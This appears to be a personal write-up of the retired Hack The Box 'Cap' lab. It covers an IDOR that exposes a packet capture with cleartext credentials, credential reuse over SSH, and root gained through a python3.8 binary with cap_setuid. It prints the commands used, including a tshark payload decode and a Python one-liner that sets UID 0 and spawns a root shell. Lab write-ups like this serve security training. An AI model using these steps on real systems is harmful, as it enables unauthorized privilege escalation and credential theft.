---
title: HTB Cap
slug: cap
lang: en
platform: Hack The Box
category: Network Forensics
headline: IDOR-exposed packet capture, credential recovery and Python capabilities abuse
difficulty: Retired
objective: Root / Administrator
date: 2024-10-26
tags: [Linux, IDOR, PCAP, FTP, Capabilities]
---

# HTB Cap

## Executive Summary

Cap exposes downloadable packet captures through predictable IDs. Although the UI starts at capture `1`, capture `0` exists and contains cleartext credentials.

## Initial Access

The PCAP is downloaded and decoded with `tshark` and `xxd`, revealing credentials that work over FTP and SSH for the `nathan` user.

## Privilege Escalation

Linux capabilities show that `python3.8` has `cap_setuid`. Using Python to set UID 0 and spawn `/bin/bash` gives a root shell.

## Key Commands

```bash
tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```

```bash
ssh nathan@cap.htb
```

```bash
getcap -r / 2>/dev/null
```

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20241026180345.png|cap evidence 01]]

![[Pasted image 20241026180603.png|cap evidence 02]]

![[Pasted image 20241026182427.png|cap evidence 03]]

![[Pasted image 20241026182553.png|cap evidence 04]]

![[Pasted image 20241026183025.png|cap evidence 05]]

![[Pasted image 20241026183148.png|cap evidence 06]]

![[Pasted image 20241026183352.png|cap evidence 07]]

![[Pasted image 20241026183659.png|cap evidence 08]]

![[Pasted image 20241026184432.png|cap evidence 09]]

![[Pasted image 20241026184542.png|cap evidence 10]]

![[Pasted image 20241026184747.png|cap evidence 11]]

![[Pasted image 20241026185037.png|cap evidence 12]]

![[Pasted image 20241026185144.png|cap evidence 13]]
